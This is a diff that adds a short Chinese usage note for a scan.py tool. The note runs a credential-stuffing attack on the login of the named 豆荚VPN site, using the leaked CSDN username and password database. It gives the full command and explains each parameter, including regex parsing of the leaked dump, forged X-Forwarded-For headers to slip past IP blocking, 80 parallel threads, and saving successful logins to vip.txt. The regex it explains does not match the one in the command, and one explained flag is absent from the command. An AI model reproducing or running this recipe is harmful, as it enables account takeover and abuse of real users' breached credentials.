@@ -1,0 +1,13 @@
+用CSDN库对豆荚VPN网站撞库：
+./scan.py -f=djvpn.txt -database username,password=csdn.txt -regex="(\S+)#\S+#(\S+)" -suc="登陆成功" -fip -nov -debug -t=80 -o=vip.txt
+参数-f：http请求数据文件
+-database：导入社工库
+username,password=csdn.txt：使用csdn.txt字典文件匹配djvpn.txt文件内username和password字段的值
+-regex="(\S+)#(\S+)"：用表达式来读csdn.txt文件，第一个括号的值给username，第二个括号的值给password
+-debug：调试模式，打印请求和响应消息
+-sleep=3s：每次请求完成后间隔3秒
+-nov：只显示成功的条目
+-fip：生成随机X-Forwarded-For头欺骗服务器(不一定有效)
+-suc="登陆成功"：服务器响应消息成功标记
+-o=vip.txt：输出结果到vip.txt文件
+-t=80：80条工作线程一起开搞
